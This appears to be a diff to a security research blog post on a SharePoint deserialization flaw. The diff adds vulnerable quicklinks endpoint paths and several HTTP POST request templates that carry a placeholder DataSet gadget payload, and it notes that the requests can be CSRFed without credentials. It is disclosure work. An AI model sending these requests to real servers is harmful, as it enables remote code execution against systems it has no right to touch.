@@ -365,11 +365,11 @@ namespace Microsoft.SharePoint.Portal.WebControls
 	{
 ```
 
-<p class="cn" markdown="1">The endpoints I found (but remain untested) are:</p>
+<p class="cn" markdown="1">I found a few endpoints that implement that control ~~(but I haven't had time to test them)~~ Update: [Soroush Dalili](https://twitter.com/irsdl) tested them for me and [confirmed](https://twitter.com/irsdl/status/1287496351429865473) that they are indeed, exploitable.</p>
 
 <div markdown="1" class="cn">
-1. https://\<target\>/_layouts/15/quicklinks.aspx
-2. https://\<target\>/_layouts/15/quicklinksdialogform.aspx
+1. /_layouts/15/quicklinks.aspx?Mode=Suggestion
+2. /_layouts/15/quicklinksdialogform.aspx?Mode=Suggestion
 </div>
 
 <p class="cn" markdown="1">Now, to exploit it we can perform a post request to our freshly crafted page:</p>
@@ -383,6 +383,32 @@ Content-Length: <length>
 
 __viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
 ```
+
+<p class="cn" markdown="1">or</p>
+
+```
+POST /quicklinks.aspx?Mode=Suggestion HTTP/1.1
+Host: <target>
+Authorization: <ntlm auth header>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: <length>
+
+__viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
+```
+
+<p class="cn" markdown="1">or</p>
+
+```
+POST /quicklinksdialogform.aspx?Mode=Suggestion HTTP/1.1
+Host: <target>
+Authorization: <ntlm auth header>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: <length>
+
+__viewstate=&__SUGGESTIONSCACHE__=<urlencoded DataSet gadget>
+```
+
+<p class="cn" markdown="1">Note that each of these endpoints could also be csrfed, so credentials are not necessarily required.</p>
 
 ## One Last Thing
 
